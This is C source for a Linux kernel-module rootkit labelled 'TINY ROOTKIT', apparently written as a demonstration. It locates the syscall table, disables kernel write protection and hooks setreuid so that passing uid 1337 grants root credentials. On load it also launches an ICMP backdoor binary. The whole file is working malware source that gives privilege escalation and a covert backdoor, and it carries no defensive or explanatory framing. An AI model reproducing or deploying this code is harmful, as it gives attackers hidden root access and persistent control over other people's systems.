#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>

#define ICMPBACKDOOR "/bin/icmp_bkd"

static unsigned long *sct;
asmlinkage int (*o_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int l33t_setreuid(uid_t reuid, uid_t euid);

// generic implementation of finding sys call table address
unsigned long *find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

// hacked setreuid
asmlinkage int l33t_setreuid(uid_t ruid, uid_t euid){

	int ret = 0;

	printk("ruid == %d && euid == %d\n", ruid, euid);

    	if(ruid == 1337 && euid == 1337){
        	commit_creds(prepare_kernel_cred(0));
        	ret = o_setreuid(0, 0);
    	} else {
		ret = o_setreuid(ruid, euid);
	}
    	return ret;
}

static int start_bin_from_userland(char *arg){
	char *argv[] = { arg, NULL, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int __init tiny_rootkit_init_module(void) { 

	printk("\e[01;36mTINY ROOTKIT \e[01;31mwritten by F0rb1dd3n\e[00m\n");
	printk("LOADING...\n");

	sct = (unsigned long *)find_sys_call_table();
	
	if(sct) {
		printk("SYS_CALL_TABLE found at: %lx\n", *sct); 
	
    		o_setreuid = (void *)sct[__NR_setreuid];
		
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_setreuid] = (unsigned long)l33t_setreuid;		
		write_cr0(read_cr0() | 0x10000);

		printk("sys_setreuid hooked!!! ;)\n");
	} else {
		printk("sys_call_table not found\n");
		//return -1;
	}
	
	printk("ICMP backdoor is called from userland\n");
	start_bin_from_userland(ICMPBACKDOOR);

	return 0; 
} 

static void __exit tiny_rootkit_exit_module(void) { 
	if (o_setreuid) {
		printk("Restoring the sys_call_table... ");
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_setreuid] = (unsigned long)o_setreuid;
		write_cr0(read_cr0() | 0x10000);
		printk("\e[01;36mOK\e[00m\n");
    	}
	printk("Good bye kernel!\n"); 
}

module_init(tiny_rootkit_init_module);
module_exit(tiny_rootkit_exit_module);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("F0rb1dd3n - ighor@intruder-security.com");
MODULE_DESCRIPTION("An exemple of a rootkit");
